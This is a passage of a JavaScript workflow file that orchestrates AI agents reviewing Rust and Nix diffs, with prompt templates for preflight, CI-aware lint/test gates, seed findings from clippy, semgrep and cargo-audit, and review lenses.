export const meta = {
  name: 'review',
  description: 'Elastic deep review of a diff — auto-detects the language(s) touched, scout-scaled lens fan-out, loop-until-dry, tool-grounded seed findings, adversarial + self-verification, synthesized into one Confirmed/Suspected report with a verdict. Rust and Nix profiles built in.',
  whenToUse: 'The single review path for any diff/PR before commit or merge. Auto-detects language; pin with args.languages (e.g. ["rust"] or ["nix"]). Scales depth to the diff automatically.',
  phases: [
    { title: 'Scout', detail: 'resolve the diff base, detect language(s), classify size/categories, pick lenses + rigor', model: 'haiku' },
    { title: 'Gate', detail: 'per-language CI-aware mechanical gate + tool-grounded seed findings' },
    { title: 'Lenses', detail: 'parallel per-lens review with context expansion; loop-until-dry' },
    { title: 'Verify', detail: 'cross-lens dedup, then adversarial refutation + self-verification of each finding' },
    { title: 'Synthesize', detail: 'calibrate severities, completeness critic, one merged report' },
  ],
}

// ---- args ----
// A caller that passes args as a JSON *string* (easy to do, and what the Workflow tool receives if
// the value is quoted) used to fail SILENTLY: every `typeof args === 'object'` guard below went
// false, every option fell back to its default, and the run reviewed whatever repo the session sat
// in — then reported a confident "Approve". Losing `repo`/`base`/`languages` without a word is the
// worst possible failure for a review. Normalize the string form, and if it cannot be parsed, say so.
const A = (() => {
  if (typeof args === 'string' && args.trim()) {
    try {
      const parsed = JSON.parse(args)
      if (parsed && typeof parsed === 'object') {
        log('⚠️ args arrived as a JSON string, not an object — parsed it; pass a real object to avoid this')
        return parsed
      }
    } catch (e) {
      log(`⚠️ args arrived as a string that is not JSON (${String((e && e.message) || e).slice(0, 60)}) — ALL options ignored, running with defaults`)
      return {}
    }
    log('⚠️ args arrived as a non-object JSON scalar — ALL options ignored, running with defaults')
    return {}
  }
  return (args && typeof args === 'object') ? args : {}
})()
const baseArg = A.base ? String(A.base) : ''
const intentArg = A.intent ? String(A.intent) : ''
const postComments = !!A.comment
const pathArg = A.path ? String(A.path) : ''   // optional crate-scope (audit per-crate fan-out)
// Absolute path to the repo under review, when it is NOT the directory the session runs in. Without
// it every agent runs `git diff` wherever the session happens to sit, so craft could only ever review
// its own checkout — reviewing a PR in another repo silently reviewed craft instead.
const repoArg = A.repo ? String(A.repo) : ''
// Where craft itself lives, so the logger can find lib/craft-log-run.mjs. As an installed plugin
// CLAUDE_PLUGIN_ROOT is set for us; when the engine is launched by scriptPath from a checkout it is
// NOT, and the `:-.` fallback would resolve against the REVIEWED repo — the script would simply not
// be there and the whole record would be lost to a "Cannot find module". Pass craftRoot then.
const craftRootArg = A.craftRoot ? String(A.craftRoot) : ''
// Every logger command runs as `cd <reviewed repo> && node <logger>`, so the `:-.` fallback would be
// resolved AFTER the cd — against the reviewed repo, where the script is not. That lost every
// checkpoint, the finalize record and the prior-round chain to "Cannot find module", silently.
// Resolve the path to an absolute one FIRST, in a variable, then change directory.
const LOGGER_PRELUDE = `CRAFT_LOGGER=${craftRootArg
  ? `${shq(craftRootArg)}/lib/craft-log-run.mjs`
  : '"$(cd "${CLAUDE_PLUGIN_ROOT:-.}" 2>/dev/null && pwd)/lib/craft-log-run.mjs"'}
`
const LOGGER_PATH = '"$CRAFT_LOGGER"'
const viaArg = A._via ? String(A._via) : ''   // set by a parent workflow (e.g. rust-audit)
const strict = !!A.strict   // harsh maintainability mode: confirmed maintainability findings become presumptive blockers
// The pin, RAW. Normalising it here as well as in `resolveProfilePin` is what made the helper's
// hardening unreachable: an `Array.isArray` guard here turned a scalar `languages: 'rust'` into
// `null` (pin silently dropped, review auto-detected instead), while a `.map(String)` turned
// `[null]` into the string `'null'` — an "unknown id" that hard-aborted the run. One normalizer:
// `resolveProfilePin` is the single place that decides what a pin means.
const requestedLangs = A.languages
const freshArg = !!A.fresh   // force a full first-pass review, ignore any prior round
// Every Nth re-review re-scans the FULL base...HEAD diff instead of only the fix delta, so a defect in
// code an intermediate round did not touch is re-discovered. Default 3; 1 = every re-review is a full
// re-scan (stateless, like adversarial-review); 0 = never (pure incremental — the pre-guard behavior).
const fullEvery = (A.fullEvery != null) ? Math.max(0, Number(A.fullEvery)) : 3

// A cold full-workspace build is the one step in this workflow that can run for an hour and take the
// whole review down with it: a gate agent that sits in `cargo clippy` stops emitting, the harness
// calls it stalled, re-dispatches it, and the replacement starts the same build from scratch. One
// real run burned 99 minutes across six gate agents that way and returned nothing. craft already
// treats an ABSENT tool as an intentional skip; a tool that cannot finish in budget is the same
// thing — an unestablished signal, which is a fine review outcome, unlike a dead run.
const GATE_TIME_BUDGET = `
TIME BUDGET (hard): wrap EVERY build/lint/test command in \`timeout\` so the shell kills it instead of
you waiting — e.g. \`timeout 600 cargo clippy … ; echo "EXIT=\${PIPESTATUS[0]}"\`. Allow roughly 10
minutes for the primary gate command and 5 for each optional one. A command that hits the timeout is
NOT a failure and NOT a retry: record that signal as unknown, say in notes which command timed out and
after how long, and move on to the next one. Never re-run a timed-out build hoping it is faster the
second time — the cache is no warmer and you will spend the whole review on it. status=fail is
reserved for a check that actually RAN and came back red. If the primary gate times out, the review
continues on the remaining signals with status=unknown — an incomplete gate beats a dead run.`

// ---- preflight: resolve the environment ONCE, before anything expensive ----
// This used to be improvised inside the gate agent, which learned it the expensive way — a measured
// run spent 50s discovering it was outside the repo's dev shell and 113s discovering the crate cannot
// compile without a database, and reported neither signal. Worse, every agent that later runs a tool
// (the gate, a lens re-running clippy, a verifier doing its MECHANICAL CHECK) rediscovered the same
// facts independently. Resolve them once, cheaply, and hand the answer to everyone downstream.
const PREFLIGHT_SCHEMA = {
  type: 'object',
  additionalProperties: false,
  required: ['runner', 'blockers', 'missingTools', 'ciCovers', 'notes'],
  properties: {
    runner: { type: 'string', description: 'prefix every build/lint command needs, e.g. "direnv exec . " or "nix develop -c " — empty string if commands run bare' },
    blockers: { type: 'array', items: { type: 'string' }, description: 'reasons this tree CANNOT compile here, one per line, e.g. "sqlx query macros need a live Postgres; no offline .sqlx cache and no DATABASE_URL"' },
    missingTools: { type: 'array', items: { type: 'string' }, description: 'gate tools not on PATH (cargo-audit, cargo-deny, semgrep, …)' },
    ciCovers: { type: 'array', items: { type: 'string' }, description: 'signals a GREEN CI check already establishes for this exact HEAD, as "<signal> via <check name>" — e.g. "test via cargo nextest", "deny-bans via cargo-deny"' },
    notes: { type: 'string' },
  },
}
function preflightPrompt(profile, ctx) {
  return `You are the PREFLIGHT for a ${profile.lang} review: resolve, cheaply and once, what the later steps must not rediscover. Diff base: ${ctx.baseRef ? `\`${flattenField(ctx.baseRef)}\`` : 'uncommitted changes / most recent commit'}.

This is reconnaissance, NOT the gate. Run nothing that compiles, builds, or takes more than a few seconds. Every answer below comes from reading the working tree or asking the API.

1. RUNNER. Does this repo pin its toolchain and system libraries in a dev shell? Look for \`.envrc\`, \`flake.nix\`, \`shell.nix\`, \`.direnv/\`. If so and \`direnv\`/\`nix\` is on PATH, the prefix is \`direnv exec . \` (preferred when \`.envrc\` exists and is allowed) or \`nix develop -c \`. Verify it works with something instant — \`<prefix>rustc --version\` or \`<prefix>true\` — never with a build. Outside such a shell, system libraries (openssl, protobuf, pkg-config) are absent and any build dies in a C dependency unrelated to the diff. Empty string only if the repo genuinely needs no prefix.

2. BLOCKERS — things that make a local build impossible no matter how long it runs, so nobody downstream wastes minutes proving it:
${profile.id === 'rust'
    ? `   - compile-time-checked SQL: \`sqlx\` in \`Cargo.lock\` with NO offline cache (no \`.sqlx/\` at the repo root or in the changed package) and no \`DATABASE_URL\` — every query macro tries to reach a live database and the crate fails to compile.
   - a build script or macro that needs a generated file, a private registry token (\`CARGO_REGISTRIES_*\`), or a service that is not running.
   - a toolchain the repo pins (\`rust-toolchain.toml\`) that is not installed and cannot be fetched offline.`
    : `   - an input the flake cannot fetch offline, a private registry/token the evaluation needs, or a builder platform this machine is not (\`system\` mismatch).`}
   Do this MECHANICALLY, not by judgement — these are \`grep\`/\`test\` questions with yes-or-no answers, and the one time this was left to inference the blocker was missed and the gate paid for a doomed compile anyway:
${profile.id === 'rust'
    ? `   \`\`\`
   grep -q '^name = "sqlx"' Cargo.lock && echo SQLX
   ls -d .sqlx */.sqlx **/.sqlx 2>/dev/null            # offline cache anywhere in the tree
   [ -n "$DATABASE_URL" ] && echo HAS_DB_URL
   \`\`\`
   SQLX present, no \`.sqlx\` directory found and no \`DATABASE_URL\` ⇒ report the blocker. Run those three commands; do not reason about whether the crate "probably" builds.`
    : `   Check the concrete inputs: \`nix flake metadata\` resolving offline, and whether the flake's \`system\` matches this machine.`}
   Report each blocker as one plain line naming what cannot run and WHY. Report nothing you have not actually checked.

3. MISSING TOOLS. Which of ${profile.id === 'rust' ? '`cargo-audit`, `cargo-deny`, `cargo-semver-checks`, `semgrep`' : '`statix`, `deadnix`, `nixpkgs-fmt`/`alejandra`, `nix-instantiate`'} are genuinely unavailable? Check BOTH ways — \`command -v <tool>\` bare AND with the runner prefix — and treat the tool as present if EITHER finds it, naming the invocation that works (e.g. "cargo-audit: ~/.cargo/bin/cargo-audit, outside the dev shell"). A dev shell usually has a NARROWER PATH than the login shell, so probing only inside it reports a tool as missing that is installed a directory away — that mistake silently dropped the entire \`cargo audit\` signal from a real run. Also try the well-known locations before concluding absence: \`~/.cargo/bin/<tool>\`. Only a tool that neither probe finds is missing — and that is an intentional skip downstream, never a failure.

4. CI COVERAGE. Which signals does a GREEN check already establish for THIS EXACT commit? \`gh pr checks --json name,state,bucket,link\` resolves by branch name and returns nothing on a review worktree or detached HEAD — that false negative costs the whole CI shortcut, so when it comes up empty look the PR up by commit:
   \`\`\`
   SHA=$(git rev-parse HEAD)
   gh api "repos/{owner}/{repo}/commits/$SHA/pulls" --jq '.[].number'
   gh api "repos/{owner}/{repo}/commits/$SHA/check-runs" --jq '.check_runs[] | "\\(.name) \\(.status) \\(.conclusion)"'
   \`\`\`
   Owner/repo from \`git remote get-url origin\`. Accept a check ONLY when it ran on your exact HEAD SHA — a PR whose head has moved past your commit proves nothing about your commit.
   Then read the workflow behind a green check to learn what it ACTUALLY runs, not what its name suggests: a job called \`cargo-deny\` running \`check bans\` covers bans and NOT advisories or licenses, and that distinction is the whole value of this step. But read NARROWLY — this is where the pass runs away with the clock: at most the handful of workflow files behind checks that are BOTH green AND map to a gate signal (build/test/clippy/fmt or a security tool). Never enumerate \`.github/workflows/*\` wholesale, never read a workflow behind a check you are not going to cite, and stop reading once every green check you intend to list is accounted for.
   List one entry per covered signal, e.g. "test via cargo nextest", "deny-bans via cargo-deny (command: check bans)". If gh is missing, unauthenticated or offline, return an empty list and say so in notes.

BUDGET (hard): this pass is reconnaissance and must stay CHEAP — target ~90 seconds, and treat three minutes as the ceiling. If CI archaeology is still going at that point, STOP and return what you have with the rest listed as unknown in notes: a partial preflight still saves the gate its worst mistakes, while a thorough one that costs more than the steps it saves is a net loss (measured: the first version took 207s and made the gate+preflight pair SLOWER than the gate had been alone). Never run a build, a test, or a full lint to answer anything here.

Return runner, blockers, missingTools, ciCovers, notes.`
}
// Rendered into every downstream prompt that might run a tool, so the answer travels with the work.
function preflightBrief(pf) {
  if (!pf) return ''
  const runner = pf.runner ? `\`${flattenField(pf.runner)}\`` : '(none needed — commands run bare)'
  const lines = [`PREFLIGHT (already resolved — do NOT rediscover any of this):`,
    `- Command prefix for every build/lint/test command: ${runner}. Commands run without it die in missing system libraries, not in your diff.`]
  if (pf.blockers?.length) lines.push(`- CANNOT BUILD HERE: ${pf.blockers.map(flattenField).join(' · ')}. Any step that needs a compile is UNRUNNABLE — skip it and say so; do NOT run it to watch it fail.`)
  if (pf.missingTools?.length) lines.push(`- Not installed (probed both bare and inside the dev shell): ${pf.missingTools.map(flattenField).join(', ')} — an absent tool is an intentional skip, never a failure. If you can nonetheless invoke one (a full path, \`nix run nixpkgs#<tool> --\`), do, and say so in provenance.`)
  lines.push(pf.ciCovers?.length
    ? `- Already GREEN in CI for this exact commit: ${pf.ciCovers.map(flattenField).join(' · ')}. Do NOT re-run these locally — CI ran the project's real command on a clean machine. Cite the check in provenance instead.`
    : `- CI covers nothing for this commit (or could not be consulted) — every signal must be established locally or reported unknown.`)
  if (pf.notes) lines.push(`- Preflight notes: ${flattenField(pf.notes)}`)
  return lines.join('\n') + '\n'
}

// ================= language profiles (inline registry — the sandbox can't import, so profiles live here) =================
function rustDepContext(ctx) {
  return `8. **Dependency context** — review against the crate versions the project ACTUALLY pins, not against crates-in-the-abstract. Resolve them: \`cargo metadata --format-version 1\` (or read \`Cargo.lock\`) and match the external crates the changed files \`use\` to their locked versions. For any nontrivial dependency the diff touches, check whether the usage is correct *for that pinned version* — a since-deprecated/removed/renamed API, a changed default, a known footgun of that exact version. Consult context7 for the crate's version-specific docs instead of trusting memory. Turn a genuine version-specific misuse into a seed finding (source "dep-context", severity Medium, ruleId "DEP-001"). Known-vulnerable versions are already covered by \`cargo audit\` (ruleId "DEP-002") — do not duplicate. Best-effort: skip silently if \`cargo metadata\` fails or the diff touches no external crate.`
}
function rustGate(ctx) {
  return `You are establishing the mechanical gate for a Rust review, CI-aware, and collecting tool-grounded seed findings. Diff base: ${ctx.baseRef ? `\`${flattenField(ctx.baseRef)}\`` : 'uncommitted changes / most recent commit'}.

${preflightBrief(ctx.preflight)}
GATE (CI-aware, per the rust-review skill — load it):
0. USE THE PREFLIGHT ABOVE. Its command prefix goes on every cargo invocation; its blockers make the matching steps unrunnable (skip them and record WHY in provenance — "pedantic seeds unavailable: sqlx macros need Postgres"); its ciCovers list is the set of signals you must NOT re-establish locally. It was resolved by a separate step precisely so this one does not pay to rediscover it. If it is absent or empty, fall back to establishing these yourself — but cheaply, by reading the tree, never by running a build to read its error.
1. Detect a PR + CI — SKIP THIS ENTIRELY if preflight already returned ciCovers; that list IS the detection, and repeating the gh calls costs ~90s for an answer you were handed. \`gh pr checks --json name,state,bucket,link\` resolves the PR from the CURRENT BRANCH NAME, which fails whenever you are not sitting on the PR's own head branch — a review worktree (\`pr-1203-review\`), a detached HEAD, or a local rename all look like "no PR" even though CI ran and is green. That is a false negative that costs the whole CI shortcut, so when the branch lookup comes up empty, LOOK UP THE PR BY COMMIT before giving up:
   \`\`\`
   SHA=$(git rev-parse HEAD)
   gh api "repos/{owner}/{repo}/commits/$SHA/pulls" --jq '.[].number'   # PRs whose head is this commit
   gh pr checks <number> --json name,state,bucket,link
   \`\`\`
   Derive owner/repo from \`git remote get-url origin\`. Also accept a PR found this way when its head SHA equals your HEAD — say so in provenance (\`via CI · PR #N · matched by SHA\`). Only if BOTH the branch and the commit lookup find nothing, or gh is missing/unauthenticated/offline, fall through to the local gate. Match generously: a check named \`cargo nextest\`, \`unit-tests\`, \`ci / test (stable)\` etc. all cover the TEST signal; \`just clippy\`, \`lint\`, \`clippy (stable)\` cover CLIPPY. A green check is the BEST evidence available — it ran on a clean machine with a warm cache and the project's real configuration. Prefer it over anything you could run here.

1b. NEVER stand up infrastructure to satisfy this gate. If a check needs a database, a container, a broker, a network service or a fixture server, that check is CI's — do not start Postgres, run \`docker\`/\`docker compose\`, apply migrations, or seed anything. Record that signal as unknown with the reason ("integration tests need Postgres; not run locally — CI owns this"). You are establishing whether a DIFF is reviewable, not reproducing the build farm. A review that never starts is worth far less than one with an unestablished test signal.
2. For build/test/clippy/fmt: if a conclusive GREEN check covers it, treat it as PASSED and record provenance "via CI #<n>". Do NOT require the check to be marked \`required\` — most repos have no branch protection at all (\`isRequired\` is then null for every check, and \`gh api …/branches/<b>/protection\` 404s), so demanding it would make this whole shortcut dead code and send you into a local build you did not need. Required-ness decides whether RED blocks a merge upstream; it says nothing about whether GREEN is trustworthy evidence — a passing job ran the project's real command on a clean machine. If a check covering fmt/clippy/test/build FAILED, set status=fail and list it in failedChecks (note whether it was required). A red check unrelated to those four is worth a line in notes, not a gate failure. Only when the signal is genuinely pending or absent, run it locally under the TIME BUDGET below.
   TAKE THE PROJECT'S LINT SEMANTICS, USE YOUR OWN SCOPE AND FORMAT. First READ the project's lint recipe — a \`clippy\`/\`lint\` target in \`justfile\`/\`Makefile\`/\`Taskfile\`, an \`[alias]\` in \`.cargo/config.toml\`, or the step its CI workflow runs (\`.github/workflows/*.yml\`) — and lift its SEMANTIC flags: the feature selection (\`--all-features\`, \`--features …\`, \`--no-default-features\`) and every \`-A\`/\`-W\`/\`-D\` lint level it sets. Those decide verdicts: a project that allows \`clippy::too_many_arguments\` will otherwise get gate failures on lints it deliberately permits, and linting the wrong feature set lints code that never ships.
   Then run it SCOPED and SHORT, which change only how much is built and how it prints, never what a lint says about a given crate:
   \`cargo clippy -p <each changed package> --all-targets --message-format=short <their feature flags> -- <their -A/-W flags> -D warnings\`
   Resolve the changed packages from the diff paths via \`cargo metadata --no-deps --format-version 1\`. Fall back to the whole workspace only when the diff genuinely spans it.
   Note the trade-off in notes: a scoped run cannot see a break this change causes in a DEPENDENT crate elsewhere in the workspace. That is CI's job — and if CI covered clippy you should not be running this at all (step 2 above). When you scope, say so, and name the packages.
   If the project defines no recipe, use \`cargo fmt --check\` and \`cargo clippy -p <changed> --all-targets --message-format=short -- -D warnings\`.
   TESTS: run them locally ONLY if CI did not cover them AND they need no infrastructure (per 1b) — and then scoped, \`cargo test -p <changed package>\`, never the whole workspace. If the changed package's tests need a service, or a bare \`cargo test\` starts pulling one up, stop and record the test signal as unknown. Do not chase a green suite; that is not what this gate is for.
3. Security tools (\`cargo audit\`, \`cargo deny\`) — usually absent from CI, so usually yours to run, but they get the SAME two rules as everything else:
   - CI COVERAGE. If preflight lists one as already green for this commit, do not re-run it. Note the sub-command: a CI job running \`cargo deny check bans\` covers bans ONLY — advisories and licenses remain yours.
   - THE PROJECT'S SCOPE, NOT THE TOOL'S DEFAULTS. Run the sub-checks the project actually configures. \`cargo deny check\` with no arguments runs advisories/bans/licenses/sources, and the unconfigured ones fall back to cargo-deny's defaults — so a \`deny.toml\` containing only \`[bans]\` will "fail" licenses and advisories on a policy the project never wrote. That is a property of the tool, not a defect in the diff. Read \`deny.toml\` (and the CI invocation) and run exactly the configured sub-checks; if a sub-check has no configuration, skip it and say so in notes rather than reporting a default-policy failure.
   - ATTRIBUTION decides which list it lands in, and only failedChecks stops the review. Check \`git diff --name-only\` against the base for \`Cargo.toml\`/\`Cargo.lock\`:
     · the diff DOES touch a dependency manifest → a vulnerability with a published fix is this change's problem: failedChecks, status=fail.
     · the diff does NOT touch one → the advisory predates this change and no edit to these files can clear it. Put it in **carriedChecks**, prefixed "PRE-EXISTING: ", and do NOT let it set status=fail. It is still reported in full — carriedChecks is printed on every verdict, not just red ones — but a gate exists to answer "is THIS DIFF reviewable", and blocking every diff in a repository on a dependency backlog it did not create means no review in that repository ever runs.
   The same attribution applies to a red \`cargo deny\` sub-check: caused by this diff → failedChecks; pre-existing → carriedChecks.
4. status = fail if any of fmt/clippy/test/build is red (CI or local), or a security check red is attributable to this diff per 3; pass if all green; unknown if you could not establish it. Anything in carriedChecks NEVER moves status — that is the whole distinction.

SEED FINDINGS (tool grounding — beyond the gate, scoped to the changed crates):
5. Pedantic seeds (a SEPARATE, optional pass — never a substitute for the gate in step 2; SKIP OUTRIGHT if preflight 0b found a compile blocker), on the SAME changed packages and the SAME feature flags you resolved there, so the two passes see the same code: \`cargo clippy -p <pkg> --all-targets --message-format=short <their feature flags> -- -W clippy::pedantic -W clippy::nursery\`. Only fall back to the whole workspace when the diff genuinely spans it. Keep the last ~200 diagnostic lines; if you truncate, SAY how many you dropped in notes — a silent cut reads as "there were only N". Turn each NEW pedantic/nursery diagnostic on changed lines into a seed finding (severity Low/Medium, source "clippy-pedantic"). Do not fail the gate on these. This step is optional: if it exceeds the budget, skip it and note that the pedantic seeds are absent.
${ctx.isLibrary ? '6. This is a library: run `cargo semver-checks check-release` if installed; each reported break is a seed finding (severity High, source "semver-checks"). If not installed, log and skip.' : '6. Not a library — skip semver-checks.'}

7. SAST seed (semgrep) — decide what configs apply, then run only if any do:
   - If a \`./semgrep/\` rules dir exists in the repo, ALWAYS include \`--config=./semgrep/\` (repo-specific banned-API/taint rules — the whole point of keeping them in-repo).
${ctx.securitySensitive
    ? '   - This diff IS security-sensitive: also include `--config=p/rust --config=p/secrets`.'
    : '   - This diff is NOT security-sensitive: do not pull the generic rulesets; rely on `./semgrep/` only (skip step 7 entirely if that dir is absent).'}
   If at least one config applies and \`semgrep\` is installed, scope it to the changed Rust files (\`git diff --name-only ${ctx.baseRef ? `--merge-base ${shq(ctx.baseRef)}` : 'HEAD'} -- '*.rs'\`) and run \`semgrep --error <configs> <files>\`. Turn each result into a seed finding (source "semgrep"; map semgrep ERROR→High, WARNING→Medium, INFO→Low). These are SEEDS, never gate failures — semgrep taint/secrets over-reports, and downstream verification refutes the false positives. If semgrep is absent or no config applies, log and skip.

${rustDepContext(ctx)}

${GATE_TIME_BUDGET}
EVIDENCE RULE: report a check as pass/fail ONLY if you ran it yourself (quote the command and its exit status / decisive output line in notes) or saw it conclusively green/red in CI (cite the check name). Never infer a pass. If the changed files are not part of a cargo project, do NOT fabricate a temporary crate/harness around them to lint or build — record build/clippy/test as not establishable (status=unknown) and say why in notes.

Set provenance to a one-line summary like "clippy/test via CI #123; fmt/audit/deny local". Put gate failures in failedChecks (NOT seedFindings). Seed findings come from clippy-pedantic / semver / semgrep / dep-context only. On every seed finding set \`ruleId\` to the matching rust-review rules.md catalog ID (e.g. "DEP-001") or "" if none fits.`
}
function nixDepContext(ctx) {
  return `6. **Dependency context** — review against the flake inputs the project ACTUALLY pins. Resolve them from \`flake.lock\` (the locked \`rev\`/\`narHash\` per input). Flag inputs that are unpinned, channel-based (\`<nixpkgs>\`), or floating where they should be locked, and \`inputs.*.follows\` that should dedupe nixpkgs but don't (source "dep-context", severity Medium, ruleId "DEP-001"). Best-effort: skip silently if there is no flake.`
}
function nixGate(ctx) {
  return `You are establishing the mechanical gate for a Nix review and collecting tool-grounded seed findings. Diff base: ${ctx.baseRef ? `\`${flattenField(ctx.baseRef)}\`` : 'uncommitted changes / most recent commit'}.

${preflightBrief(ctx.preflight)}
GATE (per the nix-review skill — load it):
0. USE THE PREFLIGHT ABOVE rather than rediscovering it: its command prefix, its blockers (a step that cannot evaluate here is skipped and reported, never run to watch it fail), its missing tools, and its ciCovers — signals already green in CI for this exact commit are cited, not re-run.
1. If a \`flake.nix\` exists: \`nix flake check\` — a failure is a gate failure (list it in failedChecks), not a seed.
2. Formatter: run \`alejandra --check .\` or \`nixpkgs-fmt --check\` (whichever the repo uses — check for a formatter in the flake / a treefmt config). Mismatches are seeds (source "fmt", Low), never a gate failure unless CI enforces fmt.
3. \`nix eval\`/\`nix build\` the attrs the diff touches — an eval or build error on changed code is a gate failure.
4. status = fail if \`nix flake check\` or an eval/build of touched attrs is red; pass if green; unknown if you could not establish it (e.g. nix not installed).

SEED FINDINGS (tool grounding — scoped to the changed files):
5. Linters — \`statix check\` (anti-idioms) and \`deadnix\` (dead bindings) on the changed \`.nix\` files. Turn each diagnostic on changed lines into a seed finding (source "statix"/"deadnix", severity Low/Medium, ruleId "MNT-001"). Do not fail the gate on these. If a linter is absent, log and skip.

${nixDepContext(ctx)}

${GATE_TIME_BUDGET}
EVIDENCE RULE: report a check as pass/fail ONLY if you ran it yourself (quote the command and its exit status / decisive output line in notes) or saw it conclusively green/red in CI. Never infer a pass; a tool you could not run is "skipped" in notes, never a pass.

Set provenance to a one-line summary like "nix flake check pass; statix/deadnix local". Put gate failures in failedChecks (NOT seedFindings). Seed findings come from statix / deadnix / fmt / dep-context only. On every seed finding set \`ruleId\` to the matching nix-review rules.md catalog ID (e.g. "MNT-001") or "" if none fits.`
}

const PROFILES = {}
PROFILES.rust = {
  id: 'rust',
  lang: 'Rust',
  detect: (files) => files.some(f => /\.rs$/.test(f) || /(^|\/)Cargo\.toml$/.test(f)),
  diffGlobs: ["'*.rs'"],
  rubricSkill: 'rust-review',
  fpRules: 'fp-rules.md', // exclusion catalog (FP-*/KEEP-*); '' for a profile that ships none
  // Rules whose per-occurrence reporting buries the review — capped mechanically by rollupPool.
  // Only completeness nits belong here: never a rule whose individual instances carry distinct risk.
  rollupRuleIds: ['API-001', 'API-003', 'API-004', 'API-005'],
  navSkill: 'rust-navigation',
  reviewerAgent: 'craft:rust-reviewer',
  securityHints: 'auth, crypto, input parsing, unsafe, FFI, or dependencies',
  usesLibrary: true,
  alwaysLenses: ['intent'],
  safetyLens: 'safety',
  scoutRules: `Decide what is "in play" from the diff: unsafe → ownership+safety; async/threads → concurrency; SQL/untrusted input → safety; loops/collections → performance; changed \`pub\` surface → api-idioms; a changed HTTP-framework handler / route, an error enum or its IntoResponse (error→HTTP-status) mapping, an OpenAPI/response-annotation, or a repository error-mapping the handlers surface → api-boundary (web-service diffs only — pick it when the diff touches the api/handler layer or the error-to-status plumbing); new/changed tests → tests; new branching / growing files / large refactor → maintainability; a changed operation on a domain entity that carries a status/lifecycle field, soft-delete, scoped foreign keys, or a documented derived/effective quantity → invariants (pick it for any medium-or-larger diff touching the domain/application/infrastructure layers); a changed reconcile loop / controller / operator (a reconcile or requeue fn, a status or condition update, a create-or-patch of a child/external resource, a finalizer or delete path), a changed typed watch / secondary-watch setup (a \`watcher\`/\`Controller::watches\`/\`secondary_watches\`/object-mapper), or a changed admission / validating-webhook handler → reconciler (pick it whenever the diff touches a controller/reconcile loop, a retry / idempotent-apply flow, a Kubernetes typed watch, or an admission webhook — this lens reads the Helm chart's webhook \`failurePolicy\` and CRD schemas, not just the Rust); a changed serde attribute / renamed-or-retagged field or enum variant / added non-defaulted field on a type that is persisted (JSONB, blob, cache, event log, message payload) or sent over the wire, or a migration renaming/retyping a column the code (de)serializes → compat (pick it whenever the diff changes an at-rest or on-the-wire representation of data that other versions of the code read). ('intent' is enforced by the engine and added automatically — do not count it toward your choices.)`,
  gate: rustGate,
  depContext: rustDepContext,
  lenses: ['safety', 'errors', 'ownership', 'concurrency', 'performance', 'api-idioms', 'api-boundary', 'reconciler', 'compat', 'maintainability', 'tests', 'intent', 'invariants'],
  lensBrief: {
    safety: 'safety / injection / secrets: unwrap/expect/panic on reachable paths, unsafe without SAFETY, SQL/command injection, path traversal, hardcoded secrets, unbounded deserialization. Also BUILD-PROFILE DIVERGENCE (SAF-007/SAF-008), where the code you review is not the code that ships: (a) arithmetic on an untrusted-input path whose outcome differs between the dev/test profile (`overflow-checks` ON) and the shipping release profile (OFF by default — read `[profile.release]` in the crate AND workspace root before assuming, it may be re-enabled). The profile-gated panic is the FLOOR of the impact, not the ceiling: do NOT close it as "does not reproduce in release" — say what the release build does INSTEAD (a silent wrap that truncates a length, misresolves an index, or corrupts state is worse than the panic, because nothing reports it), and report both facets. (b) a `debug_assert!` carrying a load-bearing invariant — an unsafe precondition, a bounds/length check, a trust-boundary validation — which compiles out in `--release`, leaving the shipped binary unguarded.',
    errors: 'error handling: recoverable failures handled with panic/unwrap, dropped #[must_use]/error values, Result-vs-panic, typed-error-vs-anyhow at API boundaries.',
    ownership: 'ownership & lifetimes: needless clone to satisfy the borrow checker, String where &str/impl AsRef suffices, Vec<T> where &[T] works, explicit lifetimes where elision applies.',
    concurrency: 'concurrency / async: blocking calls inside async, lock held across .await, unbounded channels, inconsistent lock order (deadlock), missing Send/Sync.',
    performance: 'performance: allocation in hot loops, to_string/to_owned where a borrow works, Vec::new+push where size is known, N+1 / repeated work in loops.',
    'api-idioms': 'API shape & public-surface idioms — spend the budget on impactful breaks, not per-item completeness nits. HIGH-VALUE (surface individually): public-API guideline breaks (API-006) — an unsealed trait meant to be closed, a private/unstable type or dependency leaked through a `pub` signature, an owned String/Vec/PathBuf parameter where &str/&[T]/&Path fits, a public enum/error without #[non_exhaustive], missing common-trait impls (Debug/Clone); a wildcard `_ =>` on a business enum that silently swallows new variants (API-002); a library leaking Box<dyn Error>/anyhow at its boundary (ERR-003). LOW-VALUE (do NOT file one finding per occurrence): missing `///` on a pub item (API-003), #[allow] without a justifying comment (API-004), crate-root #![deny(warnings)] (API-005), oversized fn / deep nesting (API-001) — roll repeated instances of each into ONE finding that names the pattern with a representative file:line, and raise an individual one only when it sits on a genuinely public library API, the doc is wrong or misleading (not merely absent), or the #[allow] hides a real defect.',
    'api-boundary': 'API boundary correctness for web services: trace every error the changed service/repository can produce to the HTTP status the handler actually returns. A domain Conflict / AlreadyExists / unique-violation / not-found (an empty fetch_one / zero-row / RowNotFound) that collapses into a generic 500 — because a broad `#[from]` on the error enum folds it into a catch-all variant, or a blanket DbError→500 in IntoResponse swallows it — instead of surfacing 409/400/404 is a finding. Method: walk the error enum `#[from]`/`From` chains and the IntoResponse/handler match arms; where the service intends a distinct typed status (a Conflict variant meaning 409, a validation error meaning 400, a not-found meaning 404) confirm a matching arm actually maps it, and flag any typed 4xx that has no variant to land in or that a `#[from]` merges into a generic error before the boundary sees it. Also OpenAPI/utoipa completeness: does the handler annotation (e.g. #[utoipa::path] responses(...)) list EVERY status the handler can actually return — cross-check the statuses the code produces (especially 404/409/400) against the documented response set, and flag any the code returns but the responses(...) omits.',
    reconciler: 'reconciler / eventual-consistency correctness for controllers and retry loops (load the rust-cloud-native skill for the idioms): a reconcile must be idempotent and safe to re-run after a partial failure. Trace the changed reconcile/requeue path and the child/secondary resources it manages. Flag where (a) a create-path and an update/patch-path for the SAME object express DIFFERENT desired state (a patch omits fields the create sets, or a new spec field never reaches the patch arm) instead of building one typed desired object (or server-side apply) that drives both arms; (b) a secondary/child step whose error is propagated AFTER the primary object was mutated but BEFORE progress is recorded (observed-generation / Ready / status) — so a transient error permanently strands state and every requeue re-mutates the primary; (c) a resource created during reconcile has NO cleanup on the delete/disable path — no owner-reference, or one that cannot work across a scope boundary (a cluster-scoped owner with a namespaced child) and no finalizer or explicit delete — leaking it; (d) a status or condition is only ever upserted and never cleared when its subject disappears (stale forever), or is written unconditionally every pass (churning transition-time / observed-generation) instead of guarding on 